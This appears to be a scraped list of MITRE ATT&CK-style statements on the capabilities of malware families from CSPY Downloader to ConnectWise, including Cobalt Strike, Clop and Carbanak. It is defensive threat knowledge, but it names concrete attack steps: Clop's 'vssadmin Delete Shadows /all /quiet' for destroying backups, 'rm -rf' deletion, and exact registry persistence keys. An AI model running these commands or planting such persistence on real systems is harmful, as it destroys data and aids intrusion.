CSPY Downloader can write to the Registry under the &lt;code&gt;%windir%&lt;/code&gt; variable to execute tasks.
CSPY Downloader can use the schtasks utility to bypass UAC.
CSPY Downloader has been packed with UPX.
CSPY Downloader can search loaded modules, PEB structure, file paths, Registry keys, and memory to determine if it is being debugged or running in a virtual environment.
CSPY Downloader can use GET requests to download additional payloads from C2.
Cachedump can extract cached password hashes from cache entry information.
CaddyWiper can work alphabetically through drives on a compromised system to take ownership of and overwrite all files.
CaddyWiper has the ability to destroy information about a physical drive's partitions including the MBR, GPT, and partition entries.
CaddyWiper can enumerate all files and directories on a compromised host.
CaddyWiper has the ability to dynamically resolve and use APIs, including `SeTakeOwnershipPrivilege`.
CaddyWiper can obtain a list of current processes.
CaddyWiper can use `DsRoleGetPrimaryDomainInformation` to determine the role of the infected machine. CaddyWiper can also halt execution if the compromised host is identified as a domain controller.
CaddyWiper can modify ACL entries to take ownership of files.
Cadelspy has the ability to identify open windows on the compromised host.
Cadelspy has the ability to compress stolen data into a .cab file.
Cadelspy has the ability to record audio from the compromised host.
Cadelspy has the ability to steal data from the clipboard.
Cadelspy has the ability to log keystrokes on the compromised host.
Cadelspy has the ability to steal information about printers and the documents sent to printers.
Cadelspy has the ability to capture screenshots and webcam photos.
Cadelspy has the ability to discover information about the compromised host.
Calisto adds permissions and remote logins to all users.
Calisto uses the &lt;code&gt;zip -r&lt;/code&gt; command to compress the data collected on the local system.
Calisto collects information on bookmarks from Google Chrome.
Calisto can collect data from user directories.
Calisto has the capability to use &lt;code&gt;rm -rf&lt;/code&gt; to remove folders and files from the victim's machine.
Calisto presents an input prompt asking for the user's login and password.
Calisto uses a hidden directory named .calisto to store data from the victim’s machine before exfiltration.
Calisto has the capability to upload and download files to the victim's machine.
Calisto collects Keychain storage data and copies those passwords/tokens to a file.
Calisto adds a .plist file to the /Library/LaunchAgents folder to maintain persistence.
Calisto uses launchctl to enable screen sharing on the victim’s machine.
Calisto has the capability to add its own account to the victim's machine.
Calisto uses a hidden directory named .calisto to store data from the victim’s machine before exfiltration.
Calisto's installation file is an unsigned DMG image under the guise of Intego’s security solution for mac.
Calisto runs the &lt;code&gt;ifconfig&lt;/code&gt; command to obtain the IP address from the victim’s machine.
CallMe exfiltrates data to its C2 server over the same protocol as C2 communications.
CallMe has the capability to download a file to the victim from the C2 server.
CallMe uses AES to encrypt C2 traffic.
CallMe has the capability to create a reverse shell on victims.
Cannon exfiltrates collected data over email via SMTP/S and POP3/S C2 channels.
Cannon can obtain victim drive information as well as a list of folders in C:\Program Files.
Cannon can download a payload for execution.
Cannon uses SMTP/S and POP3/S for C2 communications by sending and receiving emails.
Cannon can obtain a list of processes running on the system.
Cannon can take a screenshot of the desktop.
Cannon can gather system information from the victim’s machine such as the OS version, machine name, and drive information.
Cannon can gather the username from the system.
Cannon can collect the current time zone information from the victim’s machine.
Cannon adds the Registry key &lt;code&gt;HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon&lt;/code&gt; to establish persistence.
Carbanak exfiltrates data in compressed chunks if a message is larger than 4096 bytes .
Carbanak has a command to delete files.
Carbanak logs key strokes for configured processes and sends them back to the C2 server.
Carbanak can create a Windows account.
Carbanak searches recursively for Outlook personal storage tables (PST) files within user directories and sends them back to the C2 server.
Carbanak obtains Windows logon password details.
Carbanak encrypts strings to make analysis more difficult.
Carbanak downloads an executable and injects it directly into a new process.
Carbanak lists running processes.
Carbanak checks the Registry key &lt;code&gt;HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings&lt;/code&gt; for proxy configurations information.
Carbanak stores a configuration files in the startup directory to automatically execute commands in order to persist across reboots.
Carbanak has a plugin for VNC and Ammyy Admin Tool.
Carbanak enables concurrent Remote Desktop Protocol (RDP) sessions.
Carbanak performs desktop video recording and captures screenshots of the desktop and sends it to the C2 server.
Carbanak encodes the message body of HTTP traffic with Base64.
Carbanak encrypts the message body of HTTP traffic with RC2 (in CBC mode). Carbanak also uses XOR with random keys for its communications.
The Carbanak malware communicates to its command server using HTTP with an encrypted payload.
Carbanak has a command to create a reverse shell.
Carberp has queued an APC routine to explorer.exe by calling ZwQueueApcThread.
Carberp has installed a bootkit on the system to maintain persistence.
Carberp has captured credentials when a user performs login through a SSL session.
Carberp has hooked several Windows API functions to steal credentials.
Carberp's passw.plug plugin can gather account information from multiple instant messaging, email, and social media services, as well as FTP, VNC, and VPN clients.
Carberp's passw.plug plugin can gather passwords saved in Opera, Internet Explorer, Safari, Firefox, and Chrome.
Carberp has attempted to disable security software by creating a suspended process for the security software and injecting code to delete antivirus core files when the process is resumed.
Carberp's bootkit can inject a malicious DLL into the address space of running processes.
Carberp has used XOR-based encryption to mask C2 server locations within the trojan.
Carberp has exfiltrated data via HTTP to already established C2 servers.
Carberp has exploited multiple Windows vulnerabilities (CVE-2010-2743, CVE-2010-3338, CVE-2010-4398, CVE-2008-1084) and a .NET Runtime Optimization vulnerability for privilege escalation.
Carberp has created a hidden file in the Startup folder of the current user.
Carberp can download and execute new plugins from the C2 server.
Carberp has masqueraded as Windows system file names, as well as "chkntfs.exe" and "syscron.exe".
Carberp has used the NtQueryDirectoryFile and ZwQueryDirectoryFile functions to hide files and directories.
Carberp has collected a list of running processes.
Carberp has searched the Image File Execution Options registry key for "Debugger" within every subkey.
Carberp has maintained persistence by placing itself inside the current user's startup folder.
Carberp has used user mode rootkit techniques to remain hidden on the system.
Carberp can capture display screenshots with the screens_dll.dll plugin.
Carberp has queried the infected system's registry searching for specific registry keys associated with antivirus products.
Carberp has collected the operating system version from the infected system.
Carberp can start a remote VNC session by downloading a new plugin.
Carberp has removed various hooks before installing the trojan or bootkit to evade sandbox analysis or other analysis software.
Carberp has connected to C2 servers via HTTP.
Carbon has used RSA encryption for C2 communications.
Carbon decrypts task and configuration files for execution.
Carbon has a command to inject code into a process.
Carbon uses HTTP to send data to the C2 server.
Carbon creates a base directory that contains the files and folders that are collected.
Carbon uses TCP and UDP for C2.
Carbon encrypts configuration files and tasks for the malware to complete using CAST-128 algorithm.
Carbon uses the &lt;code&gt;net group&lt;/code&gt; command.
Carbon can list the processes on the victim’s machine.
Carbon enumerates values in the Registry.
Carbon uses the &lt;code&gt;net view&lt;/code&gt; command.
Carbon creates several tasks for later execution to continue persistence on the victim’s machine.
Carbon can collect the IP address of the victims and other computers on the network using the commands: &lt;code&gt;ipconfig -all&lt;/code&gt; &lt;code&gt;nbtstat -n&lt;/code&gt;, and &lt;code&gt;nbtstat -s&lt;/code&gt;.
Carbon uses the &lt;code&gt;netstat -r&lt;/code&gt; and &lt;code&gt;netstat -an&lt;/code&gt; commands.
Carbon uses the command &lt;code&gt;net time \\127.0.0.1&lt;/code&gt; to get information the system’s time.
Carbon can use HTTP in C2 communications.
Carbon can use Pastebin to receive C2 commands.
Carbon establishes persistence by creating a service and naming it based off the operating system version running on the current machine.
Cardinal RAT applies compression to C2 traffic using the ZLIB library.
Cardinal RAT and its watchdog component are compiled and executed after being delivered to victims as embedded, uncompiled source code.
Cardinal RAT decodes many of its artifacts and is decrypted (AES-128) after being downloaded.
Cardinal RAT encodes many of its artifacts and is encrypted (AES-128) when downloaded.
Cardinal RAT can communicate over multiple C2 host and port combinations.
Cardinal RAT can uninstall itself, including deleting its executable.
Cardinal RAT checks its current working directory upon execution and also contains watchdog functionality that ensures its executable is located in the correct path (else it will rewrite the payload).
Cardinal RAT can download and execute additional payloads.
Cardinal RAT can log keystrokes.
Cardinal RAT lures victims into executing malicious macros embedded within Microsoft Excel documents.
Cardinal RAT sets &lt;code&gt;HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load&lt;/code&gt; to point to its executable.
Cardinal RAT contains watchdog functionality that ensures its process is always running, else spawns a new instance.
Cardinal RAT injects into a newly spawned process created from a native Windows executable.
Cardinal RAT can act as a reverse proxy.
Cardinal RAT contains watchdog functionality that periodically ensures &lt;code&gt;HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load&lt;/code&gt; is set to point to its executable.
Cardinal RAT establishes Persistence by setting the  &lt;code&gt;HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load&lt;/code&gt; Registry key to point to its executable.
Cardinal RAT can capture screenshots.
Cardinal RAT uses a secret key with a series of XOR and addition operations to encrypt C2 traffic.
Cardinal RAT can collect the hostname, Microsoft Windows version, and processor architecture from a victim machine.
Cardinal RAT can collect the username from a victim machine.
Cardinal RAT is downloaded using HTTP over port 443.
Cardinal RAT can execute commands.
Catchamas obtains application windows titles and then determines which windows to perform Screen Capture on.
Catchamas steals data stored in the clipboard.
Catchamas collects keystrokes from the victim’s machine.
Catchamas stores the gathered data from the machine in .db files and .bmp files under four separate locations.
Catchamas adds a new service named NetAdapter in an apparent attempt to masquerade as a legitimate service.
Catchamas creates three Registry keys to establish persistence by adding a Windows Service.
Catchamas captures screenshots based on specific keywords in the window’s title.
Catchamas gathers the Mac address, IP address, and the network adapter information from the victim’s machine.
Catchamas adds a new service named NetAdapter to establish persistence.
Caterpillar WebShell has a module to perform brute force attacks on a system.
Caterpillar WebShell has a module to collect information from the local database.
Caterpillar WebShell can upload files over the C2 channel.
Caterpillar WebShell can search for files in directories.
Caterpillar WebShell has a module to download and upload files to the system.
Caterpillar WebShell can obtain a list of local groups of users from a system.
Caterpillar WebShell has a command to modify a Registry key.
Caterpillar WebShell has a module to use a port scanner on a system.
Caterpillar WebShell can gather a list of processes running on the machine.
Caterpillar WebShell has a module to use a rootkit on a system.
Caterpillar WebShell has a module to gather information from the compromrised asset, including the computer version, computer name, IIS version, and more.
Caterpillar WebShell can gather the IP address from the victim's machine using the IP config command.
Caterpillar WebShell can obtain a list of user accounts from a victim's machine.
Caterpillar WebShell can obtain a list of the services from a system.
Caterpillar WebShell can run commands on the compromised asset with CMD functions.
ChChes samples were digitally signed with a certificate originally used by Hacking Team that was later leaked and subsequently revoked.
ChChes steals credentials stored inside Internet Explorer.
ChChes can alter the victim's proxy configuration.
ChChes collects the victim's %TEMP% directory path and version of Internet Explorer.
ChChes is capable of downloading files, including additional modules.
ChChes copies itself to an .exe file with a filename that is likely intended to imitate Norton Antivirus but has several letters reversed (e.g. notron.exe).
ChChes collects its process identifier (PID) on the victim.
ChChes establishes persistence by adding a Registry Run key.
ChChes can encode C2 data with a custom technique that utilizes Base64.
ChChes can encrypt C2 traffic with AES or RC4.
ChChes collects the victim hostname, window resolution, and Microsoft Windows version.
ChChes communicates to its C2 server over HTTP and embeds data within the Cookie HTTP header.
Chaes has used the Puppeteer module to hook and monitor the Chrome web browser to collect user information from infected hosts.
Chaes can steal login credentials and stored financial information from the browser.
Chaes has used search order hijacking to load a malicious DLL.
Chaes has decrypted an AES encrypted binary file to trigger the download of other files.
Chaes has used encryption for its C2 channel.
Chaes has exfiltrated its collected data from the infected machine to the C2, sometimes using the MIME protocol.
Some versions of Chaes stored its instructions (otherwise in a `instructions.ini` file) in the Registry.
Chaes can download additional files onto an infected machine.
Chaes has a module to perform any API hooking it desires.
Chaes has used Installutill to download content.
Chaes has used JavaScript and Node.Js information stealer script that exfiltrates data using the node process.
Chaes requires the user to click on the malicious Word document to execute the next part of the attack.
Chaes has used an unsigned, crafted DLL module named &lt;code&gt;hha.dll&lt;/code&gt; that was designed to look like a legitimate 32-bit Windows DLL.
Chaes can modify Registry values to stored information and establish persistence.
Chaes has used .MSI files as an initial way to start the infection chain.
Chaes used the &lt;code&gt;CreateFileW()&lt;/code&gt; API function with read permissions to access downloaded payloads.
Chaes has used Python scripts for execution and the installation of additional files.
Chaes has added persistence via the Registry key &lt;code&gt;software\microsoft\windows\currentversion\run\microsoft windows html help&lt;/code&gt;.
Chaes can capture screenshots of the infected machine.
Chaes has been delivered by sending victims a phishing email containing a malicious .docx file.
Chaes has used Base64 to encode C2 communications.
Chaes has used a script that extracts the web session cookie and sends it to the C2 server.
Chaes has collected system information, including the machine name and OS version.
Chaes has collected the username and UID from the infected machine.
Chaes changed the template target of the settings.xml file embedded in the Word document and populated that field with the downloaded URL of the next payload.
Chaes has used VBscript to execute malicious code.
Chaes has used HTTP for C2 communications.
Chaes has used cmd to execute tasks on the system.
Chaos conducts brute force attacks against SSH services to gain initial access.
After initial compromise, Chaos will download a second stage to establish a more permanent presence on the affected system.
Chaos provides a reverse shell connection on 8338/TCP, encrypted via AES.
Chaos provides a reverse shell is triggered upon receipt of a packet with a special string, sent to any port.
Chaos provides a reverse shell connection on 8338/TCP, encrypted via AES.
CharmPower can collect data and files from a compromised host.
CharmPower can retrieve C2 domain information from actor-controlled S3 buckets.
CharmPower can decrypt downloaded modules prior to execution.
CharmPower can exfiltrate gathered data to a hardcoded C2 URL via HTTP POST.
CharmPower can send victim data via FTP with credentials hardcoded in the script.
CharmPower can change its C2 channel once every 360 loops by retrieving a new domain from the actors’ S3 bucket.
CharmPower can delete created files from a compromised system.
CharmPower can enumerate drives and list the contents of the C: drive on a victim's computer.
CharmPower has the ability to download additional modules to a compromised host.
CharmPower can remove persistence-related artifacts from the Registry.
CharmPower can use PowerShell for payload execution and C2 communication.
CharmPower has the ability to list running processes through the use of `tasklist`.
CharmPower has the ability to enumerate `Uninstall` registry values.
CharmPower has the ability to capture screenshots.
CharmPower can list the installed applications on a compromised host.
CharmPower can send additional modules over C2 encoded with base64.
CharmPower can send additional modules over C2 encrypted with a simple substitution cipher.
CharmPower can enumerate the OS version and computer name on a targeted system.
CharmPower has the ability to use &lt;code&gt;ipconfig&lt;/code&gt; to enumerate system network settings.
CharmPower can use `netsh wlan show profiles` to list specific Wi-Fi profile details.
CharmPower can use HTTP to communicate with C2.
CharmPower can download additional modules from actor-controlled Amazon S3 buckets.
The C# implementation of  the CharmPower command execution module can use &lt;code&gt;cmd&lt;/code&gt;.
CharmPower can use `wmic` to gather information from a system.
Cheerscrypt can encrypt data on victim machines using a Sosemanuk stream cipher with an Elliptic-curve Diffie–Hellman (ECDH) generated key.
Cheerscrypt can search for log and VMware-related files with .log, .vmdk, .vmem, .vswp, and .vmsn extensions.
Cheerscrypt has the ability to terminate VM processes on compromised hosts through execution of `esxcli vm process kill`.
Some variants of Cherry Picker use AppInit_DLLs to achieve persistence by creating the following Registry key: &lt;code&gt;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows "AppInit_DLLs"="pserver32.dll"&lt;/code&gt;
Cherry Picker exfiltrates files over FTP.
Recent versions of Cherry Picker delete files and registry keys created by the malware.
China Chopper's server component can upload local files.
China Chopper's server component can list directory contents.
China Chopper's server component can download remote files.
China Chopper's server component can spider authentication portals.
China Chopper's server component can perform brute force password guessing against authentication portals.
China Chopper's client component is packed with UPX.
China Chopper's server component can change the timestamp of files.
China Chopper's server component executes code sent via HTTP POST commands.
China Chopper's server component is a Web Shell payload.
China Chopper's server component is capable of opening a command terminal.
Chinoxy can use a digitally signed binary ("Logitech Bluetooth Wizard Host Process") to load its dll into memory.
The Chinoxy dropping function can initiate decryption of its config file.
Chinoxy has encrypted its configuration file.
Chinoxy has used the name `eoffice.exe` in attempt to appear as a legitimate file.
Chinoxy has established persistence via the `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` registry key and by loading a dropper to `(%COMMON_ STARTUP%\\eoffice.exe)`.
Chrommme can encrypt and store on disk collected data before exfiltration.
Chrommme can collect data from a local system.
Chrommme can decrypt its encrypted internal code.
Chrommme can encrypt sections of its code to evade detection.
Chrommme can exfiltrate collected data via C2.
Chrommme can download its code from C2.
Chrommme can store captured system information locally prior to exfiltration.
Chrommme can use Windows API including `WinExec` for execution.
Chrommme can set itself to sleep before requesting a new command from C2.
Chrommme has the ability to capture screenshots.
Chrommme has the ability to list drives and obtain the computer name of a compromised host.
Chrommme can enumerate the IP address of a compromised host.
Chrommme can retrieve the username from a targeted system.
Clambling has the ability to use Telnet for communication.
Clambling can use Dropbox to download malicious payloads, send commands, and receive information.
Clambling has the ability to bypass UAC using a `passuac.dll` file.
Clambling has the ability to capture and store clipboard data.
Clambling can store a file named `mpsvc.dll`, which opens a malicious `mpsvc.mui` file, in the same folder as the legitimate Microsoft executable `MsMpEng.exe` to gain execution.
Clambling can collect information from a compromised host.
Clambling can deobfuscate its payload prior to execution.
Clambling can send files from a victim's machine to Dropbox.
Clambling can browse directories on a compromised host.
Clambling has the ability to set its file attributes to hidden.
Clambling can capture keystrokes on a compromised host.
Clambling has gained execution through luring victims into opening malicious files.
Clambling can set and delete Registry keys.
Clambling has the ability to enumerate network shares.
Clambling has the ability to use TCP and UDP for communication.
The Clambling executable has been obfuscated when dropped on a compromised host.
The Clambling dropper can use PowerShell to download the malware.
Clambling can enumerate processes on a targeted system.
Clambling can execute binaries through process hollowing.
Clambling can inject into the `svchost.exe` process for execution.
Clambling has the ability to enumerate Registry keys, including &lt;code&gt;KEY_CURRENT_USER\Software\Bitcoin\Bitcoin-Qt\strDataDir&lt;/code&gt; to search for a bitcoin wallet.
Clambling can establish persistence by adding a Registry run key.
Clambling has the ability to capture screenshots.
Clambling can create and start services on a compromised host.
Clambling has been delivered to victim's machines through malicious e-mail attachments.
Clambling can discover the hostname, computer name, and Windows version of a targeted machine.
Clambling can enumerate the IP address of a compromised machine.
Clambling can identify the username on a compromised host.
Clambling can determine the current time.
Clambling can wait 30 minutes before initiating contact with C2.
Clambling can record screen content in AVI format.
Clambling has the ability to communicate over HTTP.
Clambling can use cmd.exe for command execution.
Clambling can register itself as a system service to gain persistence.
Clop can use code signing to evade detection.
Clop can encrypt files using AES, RSA, and RC4 and will add the ".clop" extension to encrypted files.
Clop has used a simple XOR operation to decrypt strings.
Clop can uninstall or disable security products.
Clop has searched folders and subfolders for files to encrypt.
Clop can delete the shadow volumes with &lt;code&gt;vssadmin Delete Shadows /all /quiet&lt;/code&gt; and can use bcdedit to disable recovery options.
Clop can make modifications to Registry keys.
Clop can use msiexec.exe to disable security tools on the system.
Clop has used built-in API functions such as WNetOpenEnumW(), WNetEnumResourceW(), WNetCloseEnum(), GetProcAddress(), and VirtualAlloc().
Clop can enumerate network shares.
Clop can enumerate all processes on the victim's machine.
Clop can search for processes with antivirus and antimalware product names.
Clop can kill several processes and services related to backups and security solutions.
Clop has been packed to help avoid detection.
Clop has checked the keyboard language using the GetKeyboardLayout() function to avoid installation on Russian-language or other Commonwealth of Independent States-language machines; it will also check the &lt;code&gt;GetTextCharset&lt;/code&gt; function.
Clop has used the &lt;code&gt;sleep&lt;/code&gt; command to avoid sandbox detection.
Clop can use cmd.exe to help execute commands on the system.
One variant of CloudDuke uses a Microsoft OneDrive account to exchange commands and stolen data with its operators.
CloudDuke downloads and executes additional malware from either a Web address or a Microsoft OneDrive account.
One variant of CloudDuke uses HTTP and HTTPS for C2.
Cobalt Strike can use RSA asymmetric encryption with PKCS1 padding to encrypt data sent to the C2 server.
Cobalt Strike can download a hosted "beacon" payload using BITSAdmin.
Cobalt Strike can perform browser pivoting and inject into a user's browser to inherit cookies, authenticated HTTP sessions, and client SSL certificates.
Cobalt Strike can use a number of known techniques to bypass Windows UAC.
Cobalt Strike can use self signed Java applets to execute signed applet attacks.
Cobalt Strike can use a custom command and control protocol that can be encapsulated in DNS. All protocols use their standard assigned ports.
Cobalt Strike will break large data sets into smaller chunks for exfiltration.
Cobalt Strike can collect data from a local system.
Cobalt Strike can deobfuscate shellcode using a rolling XOR and decrypt metadata from Beacon sessions.
Cobalt Strike has the ability to use Smart Applet attacks to disable the Java SecurityManager sandbox.
Cobalt Strike can deliver Beacon payloads for lateral movement by leveraging remote COM execution.
Cobalt Strike can determine if the user on an infected machine is in the admin or domain admin group.
Cobalt Strike can use known credentials to run commands and spawn processes as a domain user account.
Cobalt Strike has the ability to accept a value for HTTP Host Header to enable domain fronting.
Cobalt Strike can identify targets by querying account groups on a domain contoller.
Cobalt Strike has the ability to load DLLs via reflective injection.
Cobalt Strike can exploit Oracle Java vulnerabilities for execution, including CVE-2011-3544, CVE-2013-2465, CVE-2012-4681, and CVE-2013-2460.
Cobalt Strike can exploit vulnerabilities such as MS14-058.
Cobalt Strike can conduct peer-to-peer communication over Windows named pipes encapsulated in the SMB protocol. All protocols use their standard assigned ports.
Cobalt Strike can explore files on a compromised system.
Cobalt Strike includes a capability to modify the Beacon payload to eliminate known signatures or unpacking methods.
Cobalt Strike can deliver additional payloads to victim machines.
Cobalt Strike can be configured to have commands relayed over a peer-to-peer network of infected hosts. This can be used to limit the number of egress points, or provide access to a host without direct internet access.
The Cobalt Strike System Profiler can use JavaScript to perform reconnaissance actions.
Cobalt Strike can track key presses with a keylogger module.
Cobalt Strike can spawn a job to inject into LSASS memory and dump password hashes.
Cobalt Strike can use known credentials to run commands and spawn processes as a local user account.
Cobalt Strike can use &lt;code&gt;net localgroup&lt;/code&gt; to list local groups on a system.
Cobalt Strike can make tokens from known credentials.
Cobalt Strike can modify Registry values within &lt;code&gt;HKEY_CURRENT_USER\Software\Microsoft\Office\&lt;Excel Version&gt;\Excel\Security\AccessVBOM\&lt;/code&gt; to enable the execution of additional code.
Cobalt Strike's Beacon payload is capable of running shell commands without &lt;code&gt;cmd.exe&lt;/code&gt; and PowerShell commands without &lt;code&gt;powershell.exe&lt;/code&gt;
Cobalt Strike can perform port scans from an infected host.
Cobalt Strike can query shared drives on the local system.
Cobalt Strike can be configured to use TCP, ICMP, and UDP for C2 communications.
Cobalt Strike can hash functions to obfuscate calls to the Windows API and use a public/private key pair to encrypt Beacon session metadata.
Cobalt Strike has the ability to use an Excel Workbook to execute additional code by enabling Office to trust macros and execute code without user permission.
Cobalt Strike can spawn processes with alternate PPIDs.
Cobalt Strike can perform pass the hash.
Cobalt Strike can execute a payload on a remote host with PowerShell. This technique does not write any data to disk. Cobalt Strike can also use PowerSploit and other scripting frameworks to perform execution.
Cobalt Strike can use spoof arguments in spawned processes that execute beacon commands.
Cobalt Strike's Beacon payload can collect information on process details.
Cobalt Strike can use process hollowing for execution.
Cobalt Strike can inject a variety of payloads into processes dynamically chosen by the adversary.
Cobalt Strike can mimic the HTTP protocol for C2 communication, while hiding the actual data in either an HTTP header, URI parameter, the transaction body, or appending it to the URI.
Cobalt Strike uses a custom command and control protocol that is encapsulated in HTTP, HTTPS, or DNS. In addition, it conducts peer-to-peer communication over Windows named pipes encapsulated in the SMB protocol. All protocols use their standard assigned ports.
Cobalt Strike can use Python to perform execution.
Cobalt Strike can query &lt;code&gt;HKEY_CURRENT_USER\Software\Microsoft\Office\&lt;Excel Version&gt;\Excel\Security\AccessVBOM\&lt;/code&gt;  to determine if the security setting for restricting default programmatic access is enabled.
Cobalt Strike's &lt;code&gt;execute-assembly&lt;/code&gt; command can run a .NET executable within the memory of a sacrificial process by loading the CLR.
Cobalt Strike can start a VNC-based remote desktop server and tunnel the connection through the already established C2 channel.
Cobalt Strike uses the native Windows Network Enumeration APIs to interrogate and discover targets in a Windows Active Directory network.
Cobalt Strike can use `rundll32.exe` to load DLL from the command line.
Cobalt Strike can use Window admin shares (C$ and ADMIN$) for lateral movement.
Cobalt Strike can SSH to a remote service.
Cobalt Strike can set its Beacon payload to reach out to the C2 server on an arbitrary and random interval.
Cobalt Strike's Beacon payload is capable of capturing screenshots.
Cobalt Strike can recover hashed passwords.
Cobalt Strike can use PsExec to execute a payload on a remote host. It can also use Service Control Manager to start new services.
The Cobalt Strike System Profiler can discover applications through the browser and identify the version of Java the target has.
Cobalt Strike can use Base64, URL-safe Base64, or NetBIOS encoding in its C2 traffic.
Cobalt Strike can use &lt;code&gt;sudo&lt;/code&gt; to run a command.
Cobalt Strike has the ability to use AES-256 symmetric encryption in CBC mode with HMAC-SHA-256 to encrypt task commands and XOR to encrypt shell code and configuration data.
Cobalt Strike can determine the NetBios name and  the IP addresses of targets machines including domain controllers.
Cobalt Strike can produce a sessions report from compromised hosts.
Cobalt Strike can enumerate services on compromised hosts.
Cobalt Strike can timestomp any files or payloads placed on a target machine to help them blend in.
Cobalt Strike can steal access tokens from exiting processes.
Cobalt Strike can use VBA to perform execution.
Cobalt Strike can use a custom command and control protocol that can be encapsulated in HTTP or HTTPS. All protocols use their standard assigned ports.
Cobalt Strike uses a command-line interface to interact with systems.
Cobalt Strike can use WMI to deliver a payload to a remote host.
Cobalt Strike can use &lt;code&gt;WinRM&lt;/code&gt; to execute a payload on a remote host.
Cobalt Strike can install a new service.
Cobian RAT has a feature to perform voice recording on the victim’s machine.
Cobian RAT uses DNS for C2.
Cobian RAT has a feature to perform keylogging on the victim’s machine.
Cobian RAT creates an autostart Registry key to ensure persistence.
Cobian RAT has a feature to perform screen capture.
Cobian RAT obfuscates communications with the C2 server using Base64 encoding.
Cobian RAT has a feature to access the webcam on the victim’s machine.
Cobian RAT can launch a remote command shell interface for executing commands.
CoinTicker decodes the initially-downloaded hidden encoded file using OpenSSL.
CoinTicker downloads the EggShell mach-o binary using curl, which does not set the quarantine flag.
CoinTicker downloads the following hidden files to evade detection and maintain persistence: /private/tmp/.info.enc, /private/tmp/.info.py, /private/tmp/.server.sh, ~/Library/LaunchAgents/.espl.plist, ~/Library/Containers/.[random string]/[random string].
CoinTicker executes a Python script to download its second stage.
CoinTicker creates user launch agents named .espl.plist and com.apple.[random string].plist to establish persistence.
CoinTicker initially downloads a hidden encoded file.
CoinTicker executes a Python script to download its second stage.
CoinTicker executes a bash script to establish a reverse shell.
CoinTicker executes a bash script to establish a reverse shell.
ComRAT can use SSL/TLS encryption for its HTTP-based C2 channel. ComRAT has used public key cryptography with RSA and AES encrypted email attachments for its Gmail C2 channel.
ComRAT has the ability to use the Gmail web UI to receive commands and exfiltrate information.
ComRAT has used encryption and base64 to obfuscate its orchestrator code in the Registry. ComRAT has also used encoded PowerShell scripts.
ComRAT samples have been seen which hijack COM objects for persistence by replacing the path to shell32.dll in registry location &lt;code&gt;HKCU\Software\Classes\CLSID\{42aedc87-2188-41fd-b9a3-0c966feabec1}\InprocServer32&lt;/code&gt;.
ComRAT has used unique per machine passwords to decrypt the orchestrator payload and a hardcoded XOR key to decrypt its communications module. ComRAT has also used a unique password to decrypt the file used for its hidden file system.
ComRAT has injected its orchestrator DLL into explorer.exe. ComRAT has also injected its communications module into the victim's default browser to make C2 connections appear less suspicious as all network connections will be initiated by the browser process.
ComRAT has embedded a XOR encrypted communications module inside the orchestrator module.
ComRAT has stored encrypted orchestrator code and payloads in the Registry.
ComRAT has used a portable FAT16 partition image placed in %TEMP% as a hidden file system.
ComRAT can use email attachments for command and control.
ComRAT has used a task name associated with Windows SQM Consolidator.
ComRAT has modified Registry values to store encrypted orchestrator code and payloads.
ComRAT can load a PE file from memory or the file system and execute it with &lt;code&gt;CreateProcessW&lt;/code&gt;.
ComRAT has encrypted its virtual file system using AES-256 in XTS mode.
ComRAT has used PowerShell to load itself every time a user logs in to the system. ComRAT can execute PowerShell scripts loaded into memory or from the file system.
ComRAT can check the default browser by querying &lt;code&gt;HKCR\http\shell\open\command&lt;/code&gt;.
ComRAT has used a scheduled task to launch its PowerShell loader.
ComRAT has been programmed to sleep outside local business hours (9 to 5, Monday to Friday).
ComRAT can check the victim's default browser to determine which process to inject its communications module into.
ComRAT has checked the victim system's date and time to perform tasks during business hours (9 to 5, Monday to Friday).
ComRAT has used HTTP requests for command and control.
ComRAT has used &lt;code&gt;cmd.exe&lt;/code&gt; to execute commands.
Comnie executes a batch script to store discovery information in %TEMP%\info.dat and then uploads the temporarily file to the remote C2 server.
Comnie uses blogs and third-party sites (GitHub, tumbler, and BlogSpot) to avoid DNS-based blocking of their communication to the command and control server.
Comnie appends a total of 64MB of garbage data to a file to deter any security products in place that may be scanning files on disk.
Comnie uses the &lt;code&gt;net user&lt;/code&gt; command.
Comnie uses RC4 and Base64 to obfuscate strings.
Comnie uses the &lt;code&gt;tasklist&lt;/code&gt; to view running processes on the victim’s machine.
Comnie achieves persistence by adding a shortcut of itself to the startup path in the Registry.
Comnie runs the &lt;code&gt;net view&lt;/code&gt; command
Comnie uses Rundll32 to load a malicious DLL.
Comnie attempts to detect several anti-virus products.
Comnie establishes persistence via a .lnk file in the victim’s startup path.
Comnie encrypts command and control communications with RC4.
Comnie collects the hostname of the victim machine.
Comnie uses &lt;code&gt;ipconfig /all&lt;/code&gt; and &lt;code&gt;route PRINT&lt;/code&gt; to identify network adapter and interface information.
Comnie executes the &lt;code&gt;netstat -ano&lt;/code&gt; command.
Comnie runs the command: &lt;code&gt;net start &gt;&gt; %TEMP%\info.dat&lt;/code&gt; on a victim.
Comnie executes VBS scripts.
Comnie uses HTTP for C2 communication.
Comnie executes BAT scripts.
Conficker terminates various services related to system security and Windows.
Conficker has used a DGA that seeds with the current UTC victim system date to generate domains.
Conficker exploited the MS08-067 Windows vulnerability for remote code execution through a crafted RPC request.
Conficker downloads an HTTP server to the infected machine.
Conficker resets system restore points and deletes backup files.
Conficker adds keys to the Registry at &lt;code&gt;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services&lt;/code&gt; and various other Registry locations.
Conficker scans for other machines to infect.
Conficker has obfuscated its code to prevent its removal from host machines.
Conficker adds Registry Run keys to establish persistence.
Conficker variants used the Windows AUTORUN feature to spread through USB propagation.
Conficker variants spread through NetBIOS share propagation.
Conficker uses the current UTC victim system date for domain generation and connects to time servers to determine the current date.
Conficker copies itself into the &lt;code&gt;%systemroot%\system32&lt;/code&gt; directory and registers as a service.
ConnectWise can be used to execute PowerShell commands on target machines.
ConnectWise can take screenshots on remote hosts.
ConnectWise can record video on remote hosts.
